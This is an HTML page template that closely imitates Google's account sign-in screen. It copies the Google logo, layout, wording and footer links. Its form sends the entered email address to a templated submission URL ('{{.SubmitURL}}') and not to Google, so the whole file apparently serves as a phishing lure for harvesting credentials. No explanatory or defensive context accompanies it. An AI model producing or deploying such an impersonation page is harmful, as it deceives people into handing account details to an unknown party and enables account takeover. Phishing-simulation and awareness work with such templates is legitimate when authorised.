<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in - Google Accounts</title>
<style>
  *{box-sizing:border-box}
  body{margin:0;font-family:Roboto,Arial,-apple-system,"Segoe UI",sans-serif;color:#202124;background:#fff}
  .wrap{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
  .card{width:448px;max-width:100%;border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px}
  .glogo{display:block;margin:0 auto 16px}
  h1{font-size:24px;font-weight:400;text-align:center;margin:0 0 6px}
  .sub{font-size:16px;text-align:center;margin:0 0 32px}
  .f{position:relative;margin:0 0 4px}
  label{position:absolute;left:10px;top:-8px;background:#fff;padding:0 5px;font-size:12px;color:#5f6368}
  input{width:100%;height:56px;border:1px solid #dadce0;border-radius:4px;padding:13px 15px;font-size:16px;color:#202124;outline:none}
  input:focus{border:2px solid #1a73e8;padding:12px 14px}
  input:focus+label{color:#1a73e8}
  .fe{display:block;color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none;margin:10px 0 0}
  .guest{font-size:14px;color:#202124;line-height:1.5;margin:28px 0 0}
  .guest a{color:#1a73e8;text-decoration:none;font-weight:500}
  .row{display:flex;justify-content:space-between;align-items:center;margin-top:34px}
  .create{color:#1a73e8;background:none;border:none;font-size:14px;font-weight:500;font-family:inherit;cursor:pointer;padding:9px 8px}
  .next{background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:500;font-family:inherit;cursor:pointer;padding:10px 24px}
  .next:hover{background:#1b66c9}
  .foot{display:flex;justify-content:space-between;max-width:448px;margin:14px auto 0;padding:0 40px;font-size:12px;color:#5f6368}
  .foot a{color:#5f6368;text-decoration:none}
</style>
</head>
<body>
  <div class="wrap">
    <form class="card" method="post" action="{{.SubmitURL}}" autocomplete="off">
      <svg class="glogo" width="40" height="40" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" aria-label="Google">
        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
      </svg>
      <h1>Sign in</h1>
      <p class="sub">Use your Google Account</p>

      <div class="f">
        <input id="id" name="identifier" type="email" placeholder=" ">
        <label for="id">Email or phone</label>
      </div>
      <a class="fe" href="#">Forgot email?</a>

      <p class="guest">Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more about using Guest mode</a></p>

      <div class="row">
        <button type="button" class="create">Create account</button>
        <button type="submit" class="next">Next</button>
      </div>
    </form>
  </div>
  <div class="foot">
    <span>English (United States)</span>
    <span><a href="#">Help</a> &nbsp; <a href="#">Privacy</a> &nbsp; <a href="#">Terms</a></span>
  </div>
</body>
</html>
